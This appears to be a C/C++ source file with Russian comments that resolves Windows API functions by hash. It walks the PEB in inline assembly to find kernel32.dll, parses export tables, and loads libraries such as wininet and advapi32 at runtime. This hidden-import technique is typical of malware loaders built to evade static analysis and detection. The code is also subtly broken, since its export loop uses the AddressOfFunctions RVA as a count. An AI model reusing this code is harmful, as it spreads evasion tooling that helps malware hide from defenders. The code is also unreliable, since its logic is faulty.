#include "Api.h"
#include "../String/StringHelpers.h"

/*
	Простенький алгоритм хэширования
	Параметры:
	- str - строка, хэш которой нужно подсчитать
	- strSize - размер строки
*/
static UINT CalcHash(char* str, size_t strSize)
{
	unsigned int hash = 0;
	if (str && strSize > 0)
	{
		for (int i = 0; i < strSize; i++, str++)
		{
			hash = (hash << 4) + *str;
			unsigned t;

			if ((t = hash & 0xf0000000) != 0)
			{
				hash = ((hash ^ (t >> 24)) & (0x0fffffff));
			}
		}
	}
	return hash;
}

/*
	Возвращает адрес функции из длл
	Параметры:
	- hModule - хэндл длл
	- funcHash - хэш имени функции 
*/
static LPVOID GetApiAddr(HMODULE hModule, UINT funcHash)
{
	PIMAGE_DOS_HEADER pDOSHdr = (PIMAGE_DOS_HEADER)hModule;

	if (pDOSHdr->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;

	PIMAGE_NT_HEADERS pNTHdr = (PIMAGE_NT_HEADERS)((LPBYTE)hModule + pDOSHdr->e_lfanew);

	if (pNTHdr->Signature != IMAGE_NT_SIGNATURE) return nullptr;

	if ((pNTHdr->FileHeader.Characteristics & IMAGE_FILE_DLL) == NULL || 
		pNTHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress == NULL || 
		pNTHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size == NULL)
	{
		return nullptr;
	}

	PIMAGE_EXPORT_DIRECTORY pIED = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)hModule +
		pNTHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

	PDWORD pdwAddress = (PDWORD)((LPBYTE)hModule + pIED->AddressOfFunctions);
	PDWORD pdwNames = (PDWORD)((LPBYTE)hModule + pIED->AddressOfNames);
	PWORD pwOrd = (PWORD)((LPBYTE)hModule + pIED->AddressOfNameOrdinals);

	for (DWORD i = 0; i < pIED->AddressOfFunctions; i++)
	{
		LPSTR pszFuncName = (LPSTR)((LPBYTE)hModule + pdwNames[i]);

		if (CalcHash(pszFuncName, strLenA(pszFuncName)) == funcHash)
		{
			return (LPVOID)((LPBYTE)hModule + pdwAddress[pwOrd[i]]);
		}
	}

	return nullptr;
}

/*
	Возвращает хэндл kernel32.dll
*/
HMODULE GetKernel32()
{
	__asm
	{
		mov eax, fs: [0x30]
		mov eax, [eax + 0xC]
		mov eax, [eax + 0xC]
		mov eax, [eax]
		mov eax, [eax]
		mov eax, [eax + 0x18]
	}
}

static HMODULE hKernel32 = nullptr;
static LPVOID ptrGetProcAddress = nullptr, ptrLoadLibraryA = nullptr;

/*
	Инициализация апи
*/
static void ApiInit()
{
	if (!hKernel32)
	{
		hKernel32 = GetKernel32();
	}

	if (!ptrGetProcAddress)
	{
		ptrGetProcAddress = (T_GetProcAddress)GetApiAddr(hKernel32, hashGetProcAddress);
	}

	if (!ptrLoadLibraryA)
	{
		ptrLoadLibraryA = (T_LoadLibraryA)GetApiAddr(hKernel32, hashLoadLibraryA);
	}
}


static HMODULE DllHandls[10];

/*
	Возвращает адрес функции
	Параметры:
	- dll - номер длл
	- funcName - имя функции
*/
LPVOID GetWinAPI(int dll, LPCSTR funcName) 
{
	ApiInit();

	char dllName[100];
	switch (dll)
	{
	case KERNEL32:
		strCpyA(dllName, StaticData::Kernel32dll);
		break;
	case USER32:
		strCpyA(dllName, StaticData::User32dll);
		break;
	case SHELL32:
		strCpyA(dllName, StaticData::Shell32dll);
		break;
	case OLE32:
		strCpyA(dllName, StaticData::Ole32dll);
		break;
	case WININET:
		strCpyA(dllName, StaticData::Wininetdll);
		break;
	case ADVAPI32:
		strCpyA(dllName, StaticData::Advapi32dll);
		break;
	default:
		return nullptr;
	}

	HMODULE hDll = DllHandls[dll];
	if (!hDll)
	{
		hDll = ((T_LoadLibraryA)ptrLoadLibraryA)(dllName);
		DllHandls[dll] = hDll;
	}

	return ((T_GetProcAddress)ptrGetProcAddress)(hDll, funcName);
}
